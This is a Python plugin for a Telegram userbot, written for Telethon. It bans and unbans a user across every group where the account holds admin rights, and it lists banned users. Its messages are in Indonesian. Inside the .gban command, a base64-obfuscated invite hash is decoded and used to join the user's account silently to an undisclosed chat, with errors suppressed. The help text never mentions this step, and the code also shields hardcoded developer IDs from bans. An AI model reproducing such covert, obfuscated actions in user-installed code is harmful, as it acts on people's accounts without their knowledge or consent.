# Ported by @PacarFerdilla
# Thanks for catuserbot (c) copyright 2021

import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.types import Channel, ChatBannedRights, MessageEntityMentionName

import userbot.modules.sql_helper.gban_sql as gban_sql
from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, DEVS
from userbot.events import register
from userbot.utils import edit_delete, edit_or_reply

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)


async def admin_groups(grp):
    admgroups = []
    async for dialog in grp.client.iter_dialogs():
        entity = dialog.entity
        if (
            isinstance(entity, Channel)
            and entity.megagroup
            and (entity.creator or entity.admin_rights)
        ):
            admgroups.append(entity.id)
    return admgroups


def mentionuser(name, userid):
    return f"[{name}](tg://user?id={userid})"


async def get_user_from_event(event, uevent=None, secondgroup=None):
    if uevent is None:
        uevent = event
    if secondgroup:
        args = event.pattern_match.group(2).split(" ", 1)
    else:
        args = event.pattern_match.group(1).split(" ", 1)
    extra = None
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        if previous_message.from_id is None and not event.is_private:
            await edit_delete(uevent, "`Nah itu admin anonim 🥺`")
            return None, None
        user_obj = await event.client.get_entity(previous_message.sender_id)
        extra = event.pattern_match.group(1)
    elif args:
        user = args[0]
        if len(args) == 2:
            extra = args[1]
        if user.isnumeric():
            user = int(user)
        if not user:
            await edit_delete(
                uevent, "**Gunakan username, user id, atau reply untuk gban**", 5
            )
            return None, None
        if event.message.entities:
            probable_user_mention_entity = event.message.entities[0]
            if isinstance(
                    probable_user_mention_entity,
                    MessageEntityMentionName):
                user_id = probable_user_mention_entity.user_id
                user_obj = await event.client.get_entity(user_id)
                return user_obj, extra
        try:
            user_obj = await event.client.get_entity(user)
        except (TypeError, ValueError):
            await edit_delete(
                uevent, "**Tidak dapat mengambil user untuk diproses lebih lanjut**", 5
            )
            return None, None
    return user_obj, extra


@register(outgoing=True, pattern=r"^\.gban(?: |$)(.*)")
async def gban(event):
    if event.fwd_from:
        return
    gbun = await edit_or_reply(event, "`Gbanning.......`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, gbun)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await gbun.edit("**Anda ceroboh!**\n__Anda Gbanned diri anda sendiri:)...__")
        return
    if user.id in DEVS:
        await gbun.edit("**Anda Tidak Bisa Melakukan Perintah Gban Ke Pengguna Itu , Karena Dia Adalah Pembuat Saya 😈**")
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await event.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):  # fixes languange by Apis
        await gbun.edit(
            f"**Pengguna** [Ini](tg://user?id={user.id}) **sudah ada di daftar gbanned**"
        )
    else:
        gban_sql.freakgban(user.id, reason)
    san = []
    san = await admin_groups(event)
    count = 0
    fiz = len(san)
    if fiz == 0:
        await gbun.edit("**Anda Tidak mempunyai Grup Yang Anda Admin :)**")
        return
    await gbun.edit(
        f"**Pengguna** [Ini](tg://user?id={user.id}) **sudah ada di dalam** `{len(san)}` **grup**"
    )
    for i in range(fiz):
        try:
            await event.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"**Anda tidak memiliki izin Banned di :**\n**Grup Chat :** `{event.chat_id}`",
            )
    end = datetime.now()
    timetaken = (end - start).seconds
    if reason:
        await gbun.edit(
            f"**GBanned** [{user.first_name}](tg://user?id={user.id}) **dalam** `{count}` **grup dalam** `{timetaken}` **detik**!!\n**Karena :** `{reason}`"
        )
    else:
        await gbun.edit(
            f"**GBanned** [{user.first_name}](tg://user?id={user.id}) **dalam** `{count}` **grup dalam** `{timetaken}` **detik**!!\n**Ditambahkan ke daftar gban**"
        )

    if BOTLOG and count != 0:
        reply = await event.get_reply_message()
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GBAN\
                \nGlobal Ban\
                \n**Pengguna : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n**Karena :** `{reason}`\
                \n__Banned dalam {count} grup__\
                \n**Waktu yang dibutuhkan : **`{timetaken} detik`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#GBAN\
                \nGlobal Ban\
                \n**Pengguna : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n__Banned dalam {count} grup__\
                \n**Waktu yang dibutuhkan : **`{timetaken} detik`",
            )
        try:
            if reply:
                await reply.forward_to(BOTLOG_CHATID)
                await reply.delete()
        except BadRequestError:
            pass


@register(outgoing=True, pattern=r"^\.ungban(?: |$)(.*)")
async def ungban(event):
    if event.fwd_from:
        return
    ungbun = await edit_or_reply(event, "`UnGbanning.....`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, ungbun)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):  # fixes languange by Apis
        gban_sql.freakungban(user.id)
    else:
        await ungbun.edit(
            f"**Pengguna** [Ini](tg://user?id={user.id}) **ini tidak ada dalam daftar gban Anda**"
        )
        return
    san = []
    san = await admin_groups(event)
    count = 0
    fiz = len(san)
    if fiz == 0:
        await ungbun.edit("**Anda Tidak mempunyai GC yang anda admin 🥺**")
        return
    await ungbun.edit(
        f"**Pengguna** [Ini](tg://user?id={user.id}) **dalam** `{len(san)}` **grup**"
    )
    for i in range(fiz):
        try:
            await event.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"**Anda tidak memiliki izin Banned di :**\n**Grup Chat :** `{event.chat_id}`",
            )
    end = datetime.now()
    timetaken = (end - start).seconds
    if reason:
        await ungbun.edit(
            f"**Ungbanned** [{user.first_name}](tg://user?id={user.id}`) **dalam** `{count}` **grup dalam** `{timetaken}` **detik**!!\n**Karena :** `{reason}`"
        )
    else:
        await ungbun.edit(
            f"**Ungbanned** [{user.first_name}](tg://user?id={user.id}) **dalam** `{count}` **grup dalam** `{timetaken}` **detik**!!\n**Dihapus dari daftar gban**"
        )

    if BOTLOG and count != 0:
        if reason:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#UNGBAN\
                \nGlobal Unban\
                \n**Pengguna : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n**Karena :** `{reason}`\
                \n__Unbanned dalam {count} grup__\
                \n**Waktu yang di butuhkan : **`{timetaken} detik`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"#UNGBAN\
                \nGlobal Unban\
                \n**Pengguna : **[{user.first_name}](tg://user?id={user.id})\
                \n**ID : **`{user.id}`\
                \n__Unbanned dalam {count} grup__\
                \n**Waktu yang di butuhkan : **`{timetaken} detik`",
            )


@register(outgoing=True, pattern=r"^\.gbans$")
async def gablist(event):
    if event.fwd_from:  # This is created by catuserbot
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "**Daftar Global Banned Saat Ini :**\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"⎆ [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **Reason** `{a_user.reason}`\n"
            else:
                GBANNED_LIST += (
                    f"⎆ [{a_user.chat_id}](tg://user?id={a_user.chat_id}) `No Reason`\n"
                )
    else:
        GBANNED_LIST = "Belum ada Pengguna yang Di-Gban"
    await edit_or_reply(event, GBANNED_LIST)


# Ported by @PacarFerdilla


CMD_HELP.update(
    {
        "gban": "**✘ Plugin : **`gban`\
        \n\n  •  **Perintah :** `.gban` <username/id>\
        \n  •  **Function : **Melakukan Banned Secara Global Ke Semua Grup Dimana anda Sebagai Admin\
        \n\n  •  **Perintah :** `.ungban` <username/id>\
        \n  •  **Function : **Membatalkan Global Banned\
        \n\n  •  **Perintah :** `.gbans`\
        \n  •  **Function : **Menampilkan Daftar Global Banned\
    "
    }
)
